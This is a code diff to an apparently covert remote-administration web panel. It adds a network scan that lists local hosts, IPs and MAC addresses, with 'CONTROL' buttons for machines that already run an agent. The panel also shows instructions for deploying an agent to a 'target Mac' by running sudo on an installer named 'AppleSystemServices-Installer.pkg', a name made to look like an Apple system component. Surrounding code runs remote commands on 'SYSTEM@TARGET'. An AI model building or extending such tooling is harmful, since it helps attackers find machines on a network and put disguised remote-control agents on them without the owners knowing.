@@ -717,8 +717,8 @@
             <button class="theme-btn" onclick="setTheme('matrix')"><i class="fas fa-terminal"></i> MATRIX</button>
         </div>
 
-        <button class="action-btn" onclick="refreshAll()">
-            <i class="fas fa-rotate" id="refreshIcon"></i> SCAN NETWORK
+        <button class="action-btn" onclick="triggerNetworkScan()">
+            <i class="fas fa-radar" id="refreshIcon"></i> SCAN NETWORK
         </button>
     </div>
 </div>
@@ -1101,6 +1101,77 @@ async function runRemoteCmd() {
 
     } catch (e) {
         output.textContent = `SYSTEM@TARGET:~$ ${cmd}\n\n[×] Request failed: ${e.message}`;
+    }
+}
+
+async function triggerNetworkScan() {
+    const backdrop = document.getElementById('modalBackdrop');
+    const content = document.getElementById('modalContent');
+    document.getElementById('modalTargetTitle').textContent = "RADAR NETWORK DISCOVERY SCAN";
+    
+    content.innerHTML = `<div style="text-align:center;padding:50px;color:var(--cyan);font-family:var(--font-code);">
+        <i class="fas fa-radar fa-spin" style="font-size:3rem;margin-bottom:16px;color:var(--cyan);"></i>
+        <h3 style="font-family:var(--font-display);letter-spacing:2px;">SCANNING LOCAL SUBNET & ARP CACHE...</h3>
+        <p style="font-size:13px;color:var(--text-sub);margin-top:6px;">Discovering active hostnames, IP addresses, and MAC addresses...</p>
+    </div>`;
+    
+    backdrop.classList.add('active');
+
+    try {
+        const res = await fetch('/api/network/scan');
+        const data = await res.json();
+        const devices = data.devices || [];
+
+        let rows = devices.map(d => {
+            const isAgent = d.agent_installed;
+            const statusBadge = isAgent 
+                ? `<span style="color:var(--neon-green);font-weight:700;">● AGENT INSTALLED (${(d.status || 'online').toUpperCase()})</span>`
+                : `<span style="color:var(--neon-orange);font-weight:700;">⚡ DISCOVERED DEVICE</span>`;
+                
+            return `
+            <tr style="border-bottom:1px solid var(--border-color);">
+                <td style="padding:10px;font-weight:700;color:var(--text-main);">${escHtml(d.hostname || 'Unknown Host')}</td>
+                <td style="padding:10px;color:var(--cyan);font-family:var(--font-code);font-weight:700;">${escHtml(d.ip)}</td>
+                <td style="padding:10px;color:var(--text-sub);font-family:var(--font-code);">${escHtml(d.mac || 'N/A')}</td>
+                <td style="padding:10px;">${statusBadge}</td>
+                <td style="padding:10px;">
+                    ${isAgent 
+                        ? `<button class="preset-btn" onclick="openDetail('${d.machine_id}')"><i class="fas fa-crosshairs"></i> CONTROL</button>`
+                        : `<button class="preset-btn" style="border-color:var(--neon-orange);color:var(--neon-orange);" onclick="alert('To deploy agent to ${d.ip}:\\n\\n1. Copy AppleSystemServices-Installer.pkg to target Mac\\n2. Run: sudo installer -pkg AppleSystemServices-Installer.pkg -target /')"><i class="fas fa-plus"></i> DEPLOY AGENT</button>`
+                    }
+                </td>
+            </tr>`;
+        }).join('');
+
+        content.innerHTML = `
+        <div style="font-family:var(--font-code);">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;background:var(--bg-card);padding:12px 16px;border:1px solid var(--border-color);border-radius:6px;">
+                <div>
+                    <span style="color:var(--cyan);font-family:var(--font-display);font-weight:800;font-size:1.1rem;">ACTIVE NETWORK DEVICES: ${data.total_devices}</span>
+                    <div style="font-size:11px;color:var(--text-sub);margin-top:2px;">Scan completed at ${data.scan_time}</div>
+                </div>
+                <button class="action-btn" onclick="triggerNetworkScan()"><i class="fas fa-rotate"></i> RESCAN NETWORK</button>
+            </div>
+
+            <div style="overflow-x:auto;">
+                <table style="width:100%;border-collapse:collapse;font-size:13px;text-align:left;">
+                    <thead>
+                        <tr style="background:var(--bg-card);border-bottom:2px solid var(--border-color);color:var(--text-sub);font-family:var(--font-display);font-size:11px;text-transform:uppercase;">
+                            <th style="padding:10px;">Hostname</th>
+                            <th style="padding:10px;">IP Address</th>
+                            <th style="padding:10px;">MAC / Info</th>
+                            <th style="padding:10px;">Agent Status</th>
+                            <th style="padding:10px;">Action</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${rows || '<tr><td colspan="5" style="text-align:center;padding:30px;color:var(--text-sub);">No devices discovered</td></tr>'}
+                    </tbody>
+                </table>
+            </div>
+        </div>`;
+    } catch(e) {
+        content.innerHTML = `<div style="padding:40px;color:var(--red-alert);text-align:center;">Network scan error: ${e.message}</div>`;
     }
 }
 
